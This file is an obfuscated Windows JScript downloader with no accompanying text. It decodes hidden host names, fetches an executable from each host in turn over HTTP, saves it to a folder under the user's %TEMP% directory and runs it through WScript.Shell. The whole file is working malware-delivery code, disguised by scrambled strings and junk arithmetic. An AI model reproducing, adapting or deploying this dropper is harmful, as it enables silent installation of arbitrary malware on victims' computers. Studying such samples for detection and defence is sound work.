

function vRUROYXPU(qDDgdeRypiq) {
var BGNYWjQY = "ucjj Ws mwNMyfF cript.S Syhlvg hell".split(" ");
var FqKOiKNB = WScript.CreateObject(BGNYWjQY[1] + BGNYWjQY[3] + BGNYWjQY[5]);
FqKOiKNB.Run(qDDgdeRypiq, 0x1, 0x0);
}
function fxwZBDhYG(xtqcP,EIBSb,WfgiZ) {
var AIZLP = "gRMiDz rfI pt.Shell GLnydhY Scri".split(" ");
var EnU=((1)?"W" + AIZLP[4]:"")+AIZLP[2];
var Bq = WScript.CreateObject(EnU);
var nO = "%TEMP%\\";
return Bq.ExpandEnvironmentStrings(nO);
}
function ZUyPCGhJ() {
var WQneqCr = "ipting";
var uaiWAZTFay = "ile";
var gdMmS = "System";
return "Sc" + "r" + WQneqCr + ".F" + uaiWAZTFay + gdMmS + "Obj" + "ect";
}
function LTQm(cylaR) {
return WScript.CreateObject(cylaR);
}
function kJyn(JOztc,oDaPF) {
JOztc.write(oDaPF);
}
function BViW(lIFOk) {
lIFOk.open();
}
function fLHC(xULjZ,spHGQ) {
xULjZ.saveToFile(spHGQ,542-540);
}
function IwZj(vutJK,VzbAp,cGxDe) {
vutJK.open(cGxDe,VzbAp,false);
}
function Neyr(BuuvL) {
if (BuuvL == 355-155){return true;} else {return false;}
}
function pNUe(TEFtk) {
if (TEFtk > 177772-865){return true;} else {return false;}
}
function XERB(QvWDi) {
var vDFLY="";
for(n=(946-946); n < QvWDi.length; n++)
if (n % (414-412) != (591-591)) {
vDFLY += QvWDi.substr(n, 991-990);
}
return vDFLY;
}
function yseH(NuaOv) {
NuaOv.send();
}
function UgAu(fZCap) {
return fZCap.status;
}
function LsTcE(BuhcUf) {
return new ActiveXObject(BuhcUf);
}
function rYSoaun(VaGr) {
VaGr.position=0;
}
var Ik="Ui5sqtMhjecr6eKaknMymbVoidLymqjqz.WchoPmU/H8R04.5epx8eW?V PojhSeLlOlfoDw6eKu7qhqb.rc0olmd/i8U0Z.Tedx3eq?l P?n e?i s?";
var N = XERB(Ik).split(" ");
var YjS = fxwZBDhYG("umTD","LdFLw","POIRdY");
var yyj = LsTcE(ZUyPCGhJ());
var PKIv = YjS+"KTEkHHw\\";
try{
yyj.CreateFolder(PKIv);
}catch(PllsHN){
};
var BcJ = "2.XMLH";
var mxk = (BcJ + "TTP" + " wsYrdNI BixQc XML ream St CrWtNNUu AD LoAjyQm OD").split(" ");
var Sq = true  , vBcz = mxk[7] + "" + mxk[9];
var Wq = LTQm("MS"+mxk[3]+(331433, mxk[0]));
var BMt = LTQm(vBcz + "B." + mxk[5]+(134319, mxk[4]));
var RFe = 0;
var S = 1;
var fuSLAod = 358861;
var f=RFe;
while (true)  {
if(f>=N.length) {break;}
var sg = 0;
var oaz = ("ht" + " OdeXbSK tp gsQHV pDVVOcVN :// YJgwRtY .e xe G ET").split(" ");
try  {
IwZj(Wq,oaz[0]+oaz[2]+oaz[5]+N[f]+S, oaz[9]+oaz[10]); yseH(Wq); if (Neyr(UgAu(Wq)))  {      
BViW(BMt); BMt.type = 1; kJyn(BMt,Wq.responseBody); if (pNUe(BMt.size))  {
sg = 1; rYSoaun(BMt);fLHC(BMt,/*9W5527CDes*/PKIv/*OS2U77bE8Q*/+fuSLAod+oaz[7]+oaz[8]); try  {
if (((new Date())>0,7466554888)) {
vRUROYXPU(PKIv+fuSLAod+/*8MEQ18kbVp*/oaz[7]+oaz[8]/*z5Zk17DegG*/); 
break;
}
}
catch (NZ)  {
}; 
}; BMt.close(); 
}; 
if (sg == 1)  {
RFe = f; break; 
}; 
}
catch (NZ)  { 
}; 
f++;
}; 

